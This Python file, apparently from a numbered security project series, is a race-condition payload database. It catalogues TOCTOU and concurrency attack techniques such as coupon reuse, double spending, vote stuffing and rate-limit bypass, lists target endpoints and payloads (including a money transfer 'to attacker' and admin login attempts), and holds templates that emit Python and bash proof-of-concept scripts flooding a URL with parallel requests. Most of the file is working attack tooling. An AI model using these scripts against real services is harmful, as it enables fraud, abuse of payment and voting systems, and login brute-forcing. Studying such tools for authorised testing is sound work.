"""
Race Condition Payload Database
Project #32: Race Condition & TOCTOU Exploitation
"""

RACE_TECHNIQUES = {
    'toctou': {
        'file_check':    'Check file exists -> Upload file',
        'balance_check': 'Check balance -> Transfer money',
        'coupon_check':  'Check coupon valid -> Apply coupon',
    },
    'concurrent': {
        'coupon_abuse':      'Apply same coupon multiple times',
        'double_spend':      'Spend same balance twice',
        'vote_manipulation': 'Vote multiple times',
        'rate_limit_bypass': 'Exceed rate limit',
    },
}

RACE_ENDPOINTS = {
    'coupon':   ['/apply-coupon'],
    'transfer': ['/transfer'],
    'vote':     ['/vote'],
    'login':    ['/login'],
}

TEST_PAYLOADS = {
    'coupon':   {'method': 'GET', 'data': {'code': 'SAVE50'}, 'threads': 20},
    'transfer': {'method': 'GET', 'data': {'amount': '100', 'to': 'attacker'}, 'threads': 10},
    'vote':     {'method': 'GET', 'data': {'id': '123'}, 'threads': 50},
    'login':    {'method': 'GET', 'data': {'username': 'admin', 'password': 'wrong'}, 'threads': 100},
}

def python_poc_template(url, method, data, threads):
    return '''#!/usr/bin/env python3
import concurrent.futures
import requests

TARGET = "%s"
METHOD = "%s"
DATA = %s
THREADS = %d

def hit(i):
    try:
        if METHOD == "POST":
            r = requests.post(TARGET, data=DATA, timeout=10)
        else:
            r = requests.get(TARGET, params=DATA, timeout=10)
        return r.status_code
    except Exception as e:
        return str(e)[:60]

def main():
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(hit, range(THREADS)):
            results.append(res)
    ok = sum(1 for r in results if r == 200)
    print("Status codes:", set(results))
    print("Successes: %%d/%%d" %% (ok, THREADS))
    if ok > 1:
        print("[!] RACE CONDITION EXPLOITED")
    else:
        print("[+] No race condition")

if __name__ == "__main__":
    main()
''' % (url, method, data, threads)

def curl_poc_template(url, method, data):
    params = '&'.join('%s=%s' % (k, v) for k, v in data.items())
    return '''#!/bin/bash
URL="%s?%s"
echo "[*] Sending 20 parallel requests to $URL"
for i in {1..20}; do
    curl -s "$URL" &
done
wait
echo ""
echo "[+] Done"
''' % (url, params)